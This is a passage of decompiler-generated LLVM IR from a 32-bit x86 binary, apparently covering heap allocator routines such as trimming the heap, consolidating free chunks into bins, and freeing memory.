  %v3_80536bd = load i32, i32* %v2_80536bd, align 4
  store i32 %v3_80536bd, i32* %ecx.global-to-local, align 4
  %v1_80536c3 = add i32 %v0_80536bb, 44
  %v2_80536c3 = inttoptr i32 %v1_80536c3 to i32*
  %v3_80536c3 = load i32, i32* %v2_80536c3, align 4
  %v1_80536c6 = add i32 %v3_80536c3, 4
  %v2_80536c6 = inttoptr i32 %v1_80536c6 to i32*
  %v3_80536c6 = load i32, i32* %v2_80536c6, align 4
  %v1_80536c9 = and i32 %v3_80536c6, -4
  store i32 %v1_80536c9, i32* @esi, align 4
  %v1_80536ce = load i32, i32* @eax, align 4
  %v2_80536ce = add i32 %v3_80536bd, -17
  %v2_80536d0 = add i32 %v2_80536ce, %v1_80536c9
  %v3_80536d0 = sub i32 %v2_80536d0, %v1_80536ce
  %div = udiv i32 %v3_80536d0, %v3_80536bd
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_80536d0, %v3_80536bd
  store i32 %tmp10, i32* @edx, align 4
  %v1_80536d8 = add i32 %div, -1
  %v4_80536db = mul i32 %v1_80536d8, %v3_80536bd
  store i32 %v4_80536db, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_80536db, 1
  br i1 %tmp11, label %dec_label_pc_8053737, label %dec_label_pc_80536e2

dec_label_pc_80536e2:                             ; preds = %dec_label_pc_80536b4
  %v1_80536e7 = call i32 @function_8054819(i32 0)
  store i32 %v1_80536e7, i32* %edi.global-to-local, align 4
  %v0_80536ee = load i32, i32* @esi, align 4
  store i32 %v0_80536ee, i32* %eax.global-to-local, align 4
  %v1_80536f0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80536f0 = add i32 %v1_80536f0, 44
  %v3_80536f0 = inttoptr i32 %v2_80536f0 to i32*
  %v4_80536f0 = load i32, i32* %v3_80536f0, align 4
  %v5_80536f0 = add i32 %v4_80536f0, %v0_80536ee
  store i32 %v5_80536f0, i32* %eax.global-to-local, align 4
  %v12_80536f6 = icmp eq i32 %v1_80536e7, %v5_80536f0
  %v1_80536f8 = icmp eq i1 %v12_80536f6, false
  br i1 %v1_80536f8, label %dec_label_pc_8053737, label %dec_label_pc_80536fa

dec_label_pc_80536fa:                             ; preds = %dec_label_pc_80536e2
  %v1_80536fd = sub i32 0, %v4_80536db
  store i32 %v1_80536fd, i32* @ebx, align 4
  %v1_8053700 = call i32 @function_8054819(i32 %v1_80536fd)
  store i32 %v1_8053700, i32* %eax.global-to-local, align 4
  %v1_805370c = call i32 @function_8054819(i32 0)
  store i32 %v1_805370c, i32* %eax.global-to-local, align 4
  %v10_8053714 = icmp eq i32 %v1_805370c, -1
  br i1 %v10_8053714, label %dec_label_pc_8053737, label %dec_label_pc_8053719

dec_label_pc_8053719:                             ; preds = %dec_label_pc_80536fa
  %v0_8053719 = load i32, i32* %edi.global-to-local, align 4
  %v2_805371b = sub i32 %v0_8053719, %v1_805370c
  %v12_805371b = icmp eq i32 %v2_805371b, 0
  store i32 %v2_805371b, i32* %ecx.global-to-local, align 4
  br i1 %v12_805371b, label %dec_label_pc_8053737, label %dec_label_pc_805371f

dec_label_pc_805371f:                             ; preds = %dec_label_pc_8053719
  %v0_805371f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805371f = add i32 %v0_805371f, 44
  %v2_805371f = inttoptr i32 %v1_805371f to i32*
  %v3_805371f = load i32, i32* %v2_805371f, align 4
  store i32 %v3_805371f, i32* %eax.global-to-local, align 4
  %v1_8053722 = add i32 %v0_805371f, 872
  %v2_8053722 = inttoptr i32 %v1_8053722 to i32*
  %v3_8053722 = load i32, i32* %v2_8053722, align 4
  %v5_8053722 = sub i32 %v3_8053722, %v2_805371b
  store i32 %v5_8053722, i32* %v2_8053722, align 4
  %v0_8053728 = load i32, i32* @esi, align 4
  %v1_8053728 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053728 = sub i32 %v0_8053728, %v1_8053728
  %v1_805372a = or i32 %v2_8053728, 1
  %v1_805372d = load i32, i32* %eax.global-to-local, align 4
  %v2_805372d = add i32 %v1_805372d, 4
  %v3_805372d = inttoptr i32 %v2_805372d to i32*
  store i32 %v1_805372a, i32* %v3_805372d, align 4
  br label %dec_label_pc_8053739

dec_label_pc_8053737:                             ; preds = %dec_label_pc_8053719, %dec_label_pc_80536fa, %dec_label_pc_80536e2, %dec_label_pc_80536b4
  br label %dec_label_pc_8053739

dec_label_pc_8053739:                             ; preds = %dec_label_pc_805371f, %dec_label_pc_8053737
  %storemerge = phi i32 [ 1, %dec_label_pc_805371f ], [ 0, %dec_label_pc_8053737 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805370c, { 1, 0, 2 }
  uselistorder i32 %v4_80536db, { 1, 2, 0 }
  uselistorder i32 %v3_80536bd, { 0, 3, 2, 1, 4 }
  uselistorder i32* %eax.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32)* @function_8054819, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8053739, { 1, 0 }
}

define i32 @function_8053741(i32* %arg1) local_unnamed_addr {
dec_label_pc_8053741:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = ptrtoint i32* %arg1 to i32
  %v0_8053742 = load i32, i32* @edi, align 4
  %v0_8053743 = load i32, i32* @esi, align 4
  %v0_8053744 = load i32, i32* @ebx, align 4
  store i32 %tmp20, i32* %edx.global-to-local, align 4
  %v2_805374c = load i32, i32* %arg1, align 4
  store i32 %v2_805374c, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8053753 = icmp eq i32 %v2_805374c, 0
  br i1 %v1_8053753, label %dec_label_pc_805386d.lr.ph, label %dec_label_pc_805375b

dec_label_pc_805386d.lr.ph:                       ; preds = %dec_label_pc_8053741
  %v3_8053871 = add i32 %tmp20, 44
  br label %dec_label_pc_805386d

dec_label_pc_805375b:                             ; preds = %dec_label_pc_8053741
  %v1_805375f = and i32 %v2_805374c, -3
  store i32 %v1_805375f, i32* %arg1, align 4
  %v1_8053764 = add i32 %tmp20, 52
  store i32 %tmp20, i32* @edx, align 4
  %v1_805376f = add i32 %tmp20, 4
  store i32 %v1_805376f, i32* %eax.global-to-local, align 4
  %v2_805377a = load i32, i32* %arg1, align 4
  %v2_8053780 = udiv i32 %v2_805377a, 8
  %v2_8053783 = mul nuw i32 %v2_8053780, 4
  %v3_8053783 = add i32 %tmp20, -4
  %v4_8053783 = add i32 %v3_8053783, %v2_8053783
  store i32 %v4_8053783, i32* %eax.global-to-local, align 4
  %v2_805384a = add i32 %tmp20, 44
  %v3_805384a = inttoptr i32 %v2_805384a to i32*
  %v1_805381d = add i32 %tmp20, 60
  %v2_805381d = inttoptr i32 %v1_805381d to i32*
  br label %dec_label_pc_805378b

dec_label_pc_805378b:                             ; preds = %dec_label_pc_8053863, %dec_label_pc_805375b
  %v0_8053799 = phi i32 [ %v1_805376f, %dec_label_pc_805375b ], [ %v4_8053863, %dec_label_pc_8053863 ]
  store i32 %v0_8053799, i32* %eax.global-to-local, align 4
  %v1_805378f = inttoptr i32 %v0_8053799 to i32*
  %v2_805378f = load i32, i32* %v1_805378f, align 4
  store i32 %v2_805378f, i32* @ecx, align 4
  %v1_8053791 = icmp eq i32 %v2_805378f, 0
  br i1 %v1_8053791, label %dec_label_pc_8053859, label %dec_label_pc_8053799

dec_label_pc_8053799:                             ; preds = %dec_label_pc_805378b
  store i32 0, i32* %v1_805378f, align 4
  %v0_805379f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805379f

dec_label_pc_805379f:                             ; preds = %dec_label_pc_805384d, %dec_label_pc_8053799
  %v0_80537bc = phi i32 [ %v3_805379f, %dec_label_pc_805384d ], [ %v0_805379f.pre, %dec_label_pc_8053799 ]
  %v1_805379f = add i32 %v0_80537bc, 8
  %v2_805379f = inttoptr i32 %v1_805379f to i32*
  %v3_805379f = load i32, i32* %v2_805379f, align 4
  store i32 %v3_805379f, i32* %edx.global-to-local, align 4
  %v1_80537a6 = add i32 %v0_80537bc, 4
  %v2_80537a6 = inttoptr i32 %v1_80537a6 to i32*
  %v3_80537a6 = load i32, i32* %v2_80537a6, align 4
  store i32 %v3_80537a6, i32* %eax.global-to-local, align 4
  %v1_80537ab = and i32 %v3_80537a6, -2
  store i32 %v1_80537ab, i32* @edi, align 4
  %v2_80537ae = urem i32 %v3_80537a6, 2
  %v3_80537ae = icmp eq i32 %v2_80537ae, 0
  %v2_80537b0 = add i32 %v1_80537ab, %v0_80537bc
  store i32 %v2_80537b0, i32* @ebx, align 4
  %v1_80537b3 = add i32 %v2_80537b0, 4
  %v2_80537b3 = inttoptr i32 %v1_80537b3 to i32*
  %v3_80537b3 = load i32, i32* %v2_80537b3, align 4
  store i32 %v3_80537b3, i32* %edx.global-to-local, align 4
  %v1_80537ba = icmp eq i1 %v3_80537ae, false
  br i1 %v1_80537ba, label %dec_label_pc_80537dc, label %dec_label_pc_80537bc

dec_label_pc_80537bc:                             ; preds = %dec_label_pc_805379f
  %v1_80537bc = inttoptr i32 %v0_80537bc to i32*
  %v2_80537bc = load i32, i32* %v1_80537bc, align 4
  store i32 %v2_80537bc, i32* %ebp.global-to-local, align 4
  %v2_80537c0 = sub i32 %v0_80537bc, %v2_80537bc
  store i32 %v2_80537c0, i32* %eax.global-to-local, align 4
  %v1_80537c2 = add i32 %v2_80537c0, 8
  %v2_80537c2 = inttoptr i32 %v1_80537c2 to i32*
  %v3_80537c2 = load i32, i32* %v2_80537c2, align 4
  store i32 %v3_80537c2, i32* @esi, align 4
  %v1_80537c5 = add i32 %v2_80537c0, 12
  %v2_80537c5 = inttoptr i32 %v1_80537c5 to i32*
  %v3_80537c5 = load i32, i32* %v2_80537c5, align 4
  store i32 %v3_80537c5, i32* %edx.global-to-local, align 4
  %v1_80537c8 = add i32 %v3_80537c2, 12
  %v2_80537c8 = inttoptr i32 %v1_80537c8 to i32*
  %v3_80537c8 = load i32, i32* %v2_80537c8, align 4
  store i32 %v3_80537c8, i32* @ecx, align 4
  %v12_80537cb = icmp eq i32 %v3_80537c8, %v2_80537c0
  %v1_80537cd = icmp eq i1 %v12_80537cb, false
  br i1 %v1_80537cd, label %dec_label_pc_805380c, label %dec_label_pc_80537cf

dec_label_pc_80537cf:                             ; preds = %dec_label_pc_80537bc
  %v1_80537cf = add i32 %v3_80537c5, 8
  %v2_80537cf = inttoptr i32 %v1_80537cf to i32*
  %v3_80537cf = load i32, i32* %v2_80537cf, align 4
  %v15_80537cf = icmp eq i32 %v3_80537cf, %v3_80537c8
  %v1_80537d2 = icmp eq i1 %v15_80537cf, false
  br i1 %v1_80537d2, label %dec_label_pc_805380c, label %dec_label_pc_80537d4

dec_label_pc_80537d4:                             ; preds = %dec_label_pc_80537cf
  %v2_80537d4 = add i32 %v2_80537bc, %v1_80537ab
  store i32 %v2_80537d4, i32* @edi, align 4
  store i32 %v3_80537c5, i32* %v2_80537c8, align 4
  %v0_80537d9 = load i32, i32* @esi, align 4
  %v1_80537d9 = load i32, i32* %edx.global-to-local, align 4
  %v2_80537d9 = add i32 %v1_80537d9, 8
  %v3_80537d9 = inttoptr i32 %v2_80537d9 to i32*
  store i32 %v0_80537d9, i32* %v3_80537d9, align 4
  %v0_80537e7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80537dc

dec_label_pc_80537dc:                             ; preds = %dec_label_pc_805379f, %dec_label_pc_80537d4
  %v1_80537f0 = phi i32 [ %v2_80537b0, %dec_label_pc_805379f ], [ %v0_80537e7.pre, %dec_label_pc_80537d4 ]
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_80537e4 = and i32 %v3_80537b3, -4
  store i32 %v1_80537e4, i32* %ebp.global-to-local, align 4
  %v4_80537e7 = load i32, i32* %v3_805384a, align 4
  %v15_80537e7 = icmp eq i32 %v1_80537f0, %v4_80537e7
  br i1 %v15_80537e7, label %dec_label_pc_805383d, label %dec_label_pc_80537ec

dec_label_pc_80537ec:                             ; preds = %dec_label_pc_80537dc
  %v2_80537ec = add i32 %v1_80537f0, 4
  %v3_80537ec = add i32 %v2_80537ec, %v1_80537e4
  %v4_80537ec = inttoptr i32 %v3_80537ec to i32*
  %v5_80537ec = load i32, i32* %v4_80537ec, align 4
  store i32 %v5_80537ec, i32* %eax.global-to-local, align 4
  %v3_80537f0 = inttoptr i32 %v2_80537ec to i32*
  store i32 %v1_80537e4, i32* %v3_80537f0, align 4
  %v0_80537f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80537f3 = urem i32 %v0_80537f3, 2
  %v2_80537f3 = icmp eq i32 %v1_80537f3, 0
  store i32 %v1_80537f3, i32* %eax.global-to-local, align 4
  %v1_80537f8 = icmp eq i1 %v2_80537f3, false
  br i1 %v1_80537f8, label %dec_label_pc_8053819, label %dec_label_pc_80537fa

dec_label_pc_80537fa:                             ; preds = %dec_label_pc_80537ec
  %v0_80537fa = load i32, i32* @ebx, align 4
  %v1_80537fa = add i32 %v0_80537fa, 8
  %v2_80537fa = inttoptr i32 %v1_80537fa to i32*
  %v3_80537fa = load i32, i32* %v2_80537fa, align 4
  store i32 %v3_80537fa, i32* @edx, align 4
  %v1_80537fd = add i32 %v0_80537fa, 12
  %v2_80537fd = inttoptr i32 %v1_80537fd to i32*
  %v3_80537fd = load i32, i32* %v2_80537fd, align 4
  store i32 %v3_80537fd, i32* %eax.global-to-local, align 4
  %v1_8053800 = add i32 %v3_80537fa, 12
  %v2_8053800 = inttoptr i32 %v1_8053800 to i32*
  %v3_8053800 = load i32, i32* %v2_8053800, align 4
  store i32 %v3_8053800, i32* @esi, align 4
  %v12_8053803 = icmp eq i32 %v3_8053800, %v0_80537fa
  %v1_8053805 = icmp eq i1 %v12_8053803, false
  br i1 %v1_8053805, label %dec_label_pc_805380c, label %dec_label_pc_8053807

dec_label_pc_8053807:                             ; preds = %dec_label_pc_80537fa
  %v1_8053807 = add i32 %v3_80537fd, 8
  %v2_8053807 = inttoptr i32 %v1_8053807 to i32*
  %v3_8053807 = load i32, i32* %v2_8053807, align 4
  %v15_8053807 = icmp eq i32 %v3_8053807, %v3_8053800
  br i1 %v15_8053807, label %dec_label_pc_8053811, label %dec_label_pc_805380c

dec_label_pc_805380c:                             ; preds = %dec_label_pc_8053807, %dec_label_pc_80537fa, %dec_label_pc_80537cf, %dec_label_pc_80537bc
  %v0_805380c = call i32 @function_8053a85()
  store i32 %v0_805380c, i32* %eax.global-to-local, align 4
  %v1_8053813.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053811

dec_label_pc_8053811:                             ; preds = %dec_label_pc_8053807, %dec_label_pc_805380c
  %v1_8053813 = phi i32 [ %v3_80537fa, %dec_label_pc_8053807 ], [ %v1_8053813.pre, %dec_label_pc_805380c ]
  %v0_8053813 = phi i32 [ %v3_80537fd, %dec_label_pc_8053807 ], [ %v0_805380c, %dec_label_pc_805380c ]
  %v0_8053811 = load i32, i32* @edi, align 4
  %v1_8053811 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053811 = add i32 %v1_8053811, %v0_8053811
  store i32 %v2_8053811, i32* @edi, align 4
  %v2_8053813 = add i32 %v1_8053813, 12
  %v3_8053813 = inttoptr i32 %v2_8053813 to i32*
  store i32 %v0_8053813, i32* %v3_8053813, align 4
  %v0_8053816 = load i32, i32* @edx, align 4
  %v1_8053816 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053816 = add i32 %v1_8053816, 8
  %v3_8053816 = inttoptr i32 %v2_8053816 to i32*
  store i32 %v0_8053816, i32* %v3_8053816, align 4
  br label %dec_label_pc_8053819

dec_label_pc_8053819:                             ; preds = %dec_label_pc_80537ec, %dec_label_pc_8053811
  store i32 %v1_8053764, i32* %eax.global-to-local, align 4
  %v3_805381d = load i32, i32* %v2_805381d, align 4
  store i32 %v3_805381d, i32* @edx, align 4
  %v0_8053820 = load i32, i32* @ecx, align 4
  store i32 %v0_8053820, i32* %v2_805381d, align 4
  %v0_8053823 = load i32, i32* @edi, align 4
  %v1_8053825 = or i32 %v0_8053823, 1
  store i32 %v1_8053825, i32* %eax.global-to-local, align 4
  %v0_8053828 = load i32, i32* @ecx, align 4
  %v1_8053828 = load i32, i32* @edx, align 4
  %v2_8053828 = add i32 %v1_8053828, 12
  %v3_8053828 = inttoptr i32 %v2_8053828 to i32*
  store i32 %v0_8053828, i32* %v3_8053828, align 4
  %v0_805382b = load i32, i32* %eax.global-to-local, align 4
  %v1_805382b = load i32, i32* @ecx, align 4
  %v2_805382b = add i32 %v1_805382b, 4
  %v3_805382b = inttoptr i32 %v2_805382b to i32*
  store i32 %v0_805382b, i32* %v3_805382b, align 4
  store i32 %v1_8053764, i32* %eax.global-to-local, align 4
  %v0_8053832 = load i32, i32* @edx, align 4
  %v1_8053832 = load i32, i32* @ecx, align 4
  %v2_8053832 = add i32 %v1_8053832, 8
  %v3_8053832 = inttoptr i32 %v2_8053832 to i32*
  store i32 %v0_8053832, i32* %v3_8053832, align 4
  %v0_8053835 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053835 = load i32, i32* @ecx, align 4
  %v2_8053835 = add i32 %v1_8053835, 12
  %v3_8053835 = inttoptr i32 %v2_8053835 to i32*
  store i32 %v0_8053835, i32* %v3_8053835, align 4
  %v0_8053838 = load i32, i32* @edi, align 4
  %v1_8053838 = load i32, i32* @ecx, align 4
  %v3_8053838 = add i32 %v1_8053838, %v0_8053838
  %v4_8053838 = inttoptr i32 %v3_8053838 to i32*
  store i32 %v0_8053838, i32* %v4_8053838, align 4
  br label %dec_label_pc_805384d

dec_label_pc_805383d:                             ; preds = %dec_label_pc_80537dc
  %v0_805383d = load i32, i32* @edi, align 4
  %v2_805383d = add i32 %v0_805383d, %v1_80537e4
  %v1_8053840 = or i32 %v2_805383d, 1
  store i32 %v1_8053840, i32* %eax.global-to-local, align 4
  %v1_8053843 = load i32, i32* @ecx, align 4
  %v2_8053843 = add i32 %v1_8053843, 4
  %v3_8053843 = inttoptr i32 %v2_8053843 to i32*
  store i32 %v1_8053840, i32* %v3_8053843, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v0_805384a = load i32, i32* @ecx, align 4
  store i32 %v0_805384a, i32* %v3_805384a, align 4
  br label %dec_label_pc_805384d

dec_label_pc_805384d:                             ; preds = %dec_label_pc_8053819, %dec_label_pc_805383d
  store i32 %v3_805379f, i32* @ecx, align 4
  %v1_8053851 = icmp eq i32 %v3_805379f, 0
  %v1_8053853 = icmp eq i1 %v1_8053851, false
  br i1 %v1_8053853, label %dec_label_pc_805379f, label %dec_label_pc_8053859

dec_label_pc_8053859:                             ; preds = %dec_label_pc_805384d, %dec_label_pc_805378b
  %v15_805385d = icmp eq i32 %v0_8053799, %v4_8053783
  br i1 %v15_805385d, label %dec_label_pc_80538e1, label %dec_label_pc_8053863

dec_label_pc_8053863:                             ; preds = %dec_label_pc_8053859
  %v4_8053863 = add i32 %v0_8053799, 4
  br label %dec_label_pc_805378b

dec_label_pc_805386d:                             ; preds = %dec_label_pc_805386d.lr.ph, %dec_label_pc_805386d
  %v1_8053871 = phi i32 [ 1, %dec_label_pc_805386d.lr.ph ], [ %v0_805387c, %dec_label_pc_805386d ]
  %v2_8053871 = mul i32 %v1_8053871, 8
  %v4_8053871 = add i32 %v3_8053871, %v2_8053871
  store i32 %v4_8053871, i32* %eax.global-to-local, align 4
  %v1_8053875 = add i32 %v1_8053871, 1
  store i32 %v1_8053875, i32* %edx.global-to-local, align 4
  %v2_8053876 = add i32 %v4_8053871, 12
  %v3_8053876 = inttoptr i32 %v2_8053876 to i32*
  store i32 %v4_8053871, i32* %v3_8053876, align 4
  %v0_8053879 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053879 = add i32 %v0_8053879, 8
  %v3_8053879 = inttoptr i32 %v2_8053879 to i32*
  store i32 %v0_8053879, i32* %v3_8053879, align 4
  %v0_805387c = load i32, i32* %edx.global-to-local, align 4
  %v7_805387f = icmp sgt i32 %v0_805387c, 95
  br i1 %v7_805387f, label %dec_label_pc_8053881, label %dec_label_pc_805386d

dec_label_pc_8053881:                             ; preds = %dec_label_pc_805386d
  store i32 %tmp20, i32* %eax.global-to-local, align 4
  %v1_8053885 = add i32 %tmp20, 864
  %v2_8053885 = inttoptr i32 %v1_8053885 to i32*
  %v3_8053885 = load i32, i32* %v2_8053885, align 4
  %v4_8053885 = or i32 %v3_8053885, 1
  store i32 %v4_8053885, i32* %v2_8053885, align 4
  %v0_805388c = load i32, i32* %eax.global-to-local, align 4
  %v1_805388c = add i32 %v0_805388c, 840
  %v2_805388c = inttoptr i32 %v1_805388c to i32*
  store i32 0, i32* %v2_805388c, align 4
  %v0_8053896 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053896 = add i32 %v0_8053896, 852
  %v2_8053896 = inttoptr i32 %v1_8053896 to i32*
  store i32 65536, i32* %v2_8053896, align 4
  %v0_80538a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80538a0 = add i32 %v0_80538a0, 844
  %v2_80538a0 = inttoptr i32 %v1_80538a0 to i32*
  store i32 262144, i32* %v2_80538a0, align 4
  %v0_80538aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80538aa = add i32 %v0_80538aa, 836
  %v2_80538aa = inttoptr i32 %v1_80538aa to i32*
  store i32 262144, i32* %v2_80538aa, align 4
  store i32 %tmp20, i32* @edx, align 4
  %v2_80538bb = load i32, i32* %arg1, align 4
  %v1_80538bd = urem i32 %v2_80538bb, 4
  %v1_80538c0 = or i32 %v1_80538bd, 72
  store i32 %v1_80538c0, i32* %arg1, align 4
  %v0_80538c5 = load i32, i32* @edx, align 4
  %v1_80538c7 = add i32 %v0_80538c5, 52
  store i32 %v1_80538c7, i32* %eax.global-to-local, align 4
  %v2_80538ca = add i32 %v0_80538c5, 44
  %v3_80538ca = inttoptr i32 %v2_80538ca to i32*
  store i32 %v1_80538c7, i32* %v3_80538ca, align 4
  %v1_80538cf = call i32 @function_8053ec9(i32 30)
  store i32 %v1_80538cf, i32* %eax.global-to-local, align 4
  %v2_80538db = add i32 %tmp20, 860
  %v3_80538db = inttoptr i32 %v2_80538db to i32*
  store i32 %v1_80538cf, i32* %v3_80538db, align 4
  br label %dec_label_pc_80538e1

dec_label_pc_80538e1:                             ; preds = %dec_label_pc_8053859, %dec_label_pc_8053881
  store i32 %v0_8053744, i32* @ebx, align 4
  store i32 %v0_8053743, i32* @esi, align 4
  store i32 %v0_8053742, i32* @edi, align 4
  %v0_80538e8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80538e8

; uselistorder directives
  uselistorder i32 %v0_805387c, { 1, 0 }
  uselistorder i32 %v0_8053879, { 1, 0 }
  uselistorder i32 %v1_8053871, { 1, 0 }
  uselistorder i32 %v0_8053838, { 1, 0 }
  uselistorder i32 %v1_80537f3, { 1, 0 }
  uselistorder i32 %v2_80537ec, { 1, 0 }
  uselistorder i32 %v1_80537e4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80537f0, { 1, 0 }
  uselistorder i32 %v3_805379f, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80537bc, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8053799, { 1, 0, 3, 2 }
  uselistorder i32* %v3_805384a, { 1, 0 }
  uselistorder i32 %v1_8053764, { 1, 0 }
  uselistorder i32 %tmp20, { 3, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder i32 -3, { 1, 0 }
  uselistorder label %dec_label_pc_80538e1, { 1, 0 }
  uselistorder label %dec_label_pc_805386d, { 1, 0 }
  uselistorder label %dec_label_pc_805384d, { 1, 0 }
  uselistorder label %dec_label_pc_8053819, { 1, 0 }
  uselistorder label %dec_label_pc_8053811, { 1, 0 }
  uselistorder label %dec_label_pc_80537dc, { 1, 0 }
}

define i32 @function_80538e9(i32 %arg1) local_unnamed_addr {
dec_label_pc_80538e9:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80538e9 = load i32, i32* @ebp, align 4
  %v0_80538ea = load i32, i32* @edi, align 4
  %v0_80538eb = load i32, i32* @esi, align 4
  %v0_80538ec = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80538f4 = icmp eq i32 %arg1, 0
  br i1 %v1_80538f4, label %dec_label_pc_8053a7d, label %dec_label_pc_80538fc

dec_label_pc_80538fc:                             ; preds = %dec_label_pc_80538e9
  %v2_8053907 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053907, i32* @eax, align 4
  %v2_805390c = call i32 @function_8054050(i32 %v2_8053907, i32 134561869)
  store i32 %v2_805390c, i32* %eax.global-to-local, align 4
  %v1_8053918 = call i32 @function_805404d(i32 ptrtoint (i32* @global_var_80567e0.205 to i32))
  %v1_805391d = add i32 %arg1, -8
  store i32 %v1_805391d, i32* @ecx, align 4
  %v0_8053920 = load i8, i8* @global_var_8056b80.206, align 1
  %v1_8053920 = sext i8 %v0_8053920 to i32
  store i32 %v1_8053920, i32* %eax.global-to-local, align 4
  %v1_8053928 = add i32 %arg1, -4
  %v2_8053928 = inttoptr i32 %v1_8053928 to i32*
  %v3_8053928 = load i32, i32* %v2_8053928, align 4
  %v1_805392d = and i32 %v3_8053928, -4
  %v4_805392d = trunc i32 %v1_805392d to i8
  store i32 %v1_805392d, i32* @ebx, align 4
  %v8_8053932 = icmp ugt i8 %v4_805392d, %v0_8053920
  br i1 %v8_8053932, label %dec_label_pc_8053954, label %dec_label_pc_8053934

dec_label_pc_8053934:                             ; preds = %dec_label_pc_80538fc
  %v2_8053934 = udiv i32 %v3_8053928, 8
  %v1_8053937 = or i32 %v1_8053920, 3
  %v3_8053937 = trunc i32 %v1_8053937 to i8
  store i32 %v1_8053937, i32* %eax.global-to-local, align 4
  store i8 %v3_8053937, i8* @global_var_8056b80.206, align 128
  %v1_805393f = mul nuw i32 %v2_8053934, 4
  %v2_805393f = add i32 %v1_805393f, ptrtoint (i8* @global_var_8056b80.206 to i32)
  store i32 %v2_805393f, i32* @edx, align 4
  %v1_8053946 = add i32 %v1_805393f, add (i32 ptrtoint (i8* @global_var_8056b80.206 to i32), i32 -4)
  %v2_8053946 = inttoptr i32 %v1_8053946 to i32*
  %v3_8053946 = load i32, i32* %v2_8053946, align 4
  store i32 %v3_8053946, i32* %eax.global-to-local, align 4
  %v3_8053949 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053946, i32* %v3_8053949, align 4
  %v0_805394c = load i32, i32* @ecx, align 4
  %v1_805394c = load i32, i32* @edx, align 4
  %v2_805394c = add i32 %v1_805394c, -4
  %v3_805394c = inttoptr i32 %v2_805394c to i32*
  store i32 %v0_805394c, i32* %v3_805394c, align 4
  br label %dec_label_pc_8053a6c

dec_label_pc_8053954:                             ; preds = %dec_label_pc_80538fc
  %v1_8053954 = trunc i32 %v3_8053928 to i8
  %v2_8053954 = and i8 %v1_8053954, 2
  %v3_8053954 = icmp eq i8 %v2_8053954, 0
  %v5_8053954 = zext i8 %v2_8053954 to i32
  %v7_8053954 = and i32 %v3_8053928, -256
  %v8_8053954 = or i32 %v5_8053954, %v7_8053954
  store i32 %v8_8053954, i32* @edx, align 4
  %v1_8053957 = icmp eq i1 %v3_8053954, false
  br i1 %v1_8053957, label %dec_label_pc_8053a4c, label %dec_label_pc_805395d

dec_label_pc_805395d:                             ; preds = %dec_label_pc_8053954
  %v1_805395d = or i32 %v1_8053920, 1
  %v3_805395d = trunc i32 %v1_805395d to i8
  store i32 %v1_805395d, i32* %eax.global-to-local, align 4
  %v2_8053960 = add i32 %v1_805392d, %v1_805391d
  store i32 %v2_8053960, i32* @esi, align 4
  store i8 %v3_805395d, i8* @global_var_8056b80.206, align 128
  %v1_8053968 = add i32 %v2_8053960, 4
  %v2_8053968 = inttoptr i32 %v1_8053968 to i32*
  %v3_8053968 = load i32, i32* %v2_8053968, align 4
  store i32 %v3_8053968, i32* %eax.global-to-local, align 4
  %v2_805396f = inttoptr i32 %v1_8053928 to i8*
  %v3_805396f = load i8, i8* %v2_805396f, align 1
  %v4_805396f = urem i8 %v3_805396f, 2
  %v5_805396f = icmp eq i8 %v4_805396f, 0
  %v1_8053973 = icmp eq i1 %v5_805396f, false
  br i1 %v1_8053973, label %dec_label_pc_8053996, label %dec_label_pc_8053975

dec_label_pc_8053975:                             ; preds = %dec_label_pc_805395d
  %v2_8053975 = inttoptr i32 %v1_805391d to i32*
  %v3_8053975 = load i32, i32* %v2_8053975, align 4
  store i32 %v3_8053975, i32* @ebp, align 4
  %v2_805397a = sub i32 %v1_805391d, %v3_8053975
  store i32 %v2_805397a, i32* %eax.global-to-local, align 4
  %v1_805397c = add i32 %v2_805397a, 8
  %v2_805397c = inttoptr i32 %v1_805397c to i32*
  %v3_805397c = load i32, i32* %v2_805397c, align 4
  store i32 %v3_805397c, i32* @edi, align 4
  %v1_805397f = add i32 %v2_805397a, 12
  %v2_805397f = inttoptr i32 %v1_805397f to i32*
  %v3_805397f = load i32, i32* %v2_805397f, align 4
  store i32 %v3_805397f, i32* @edx, align 4
  %v1_8053982 = add i32 %v3_805397c, 12
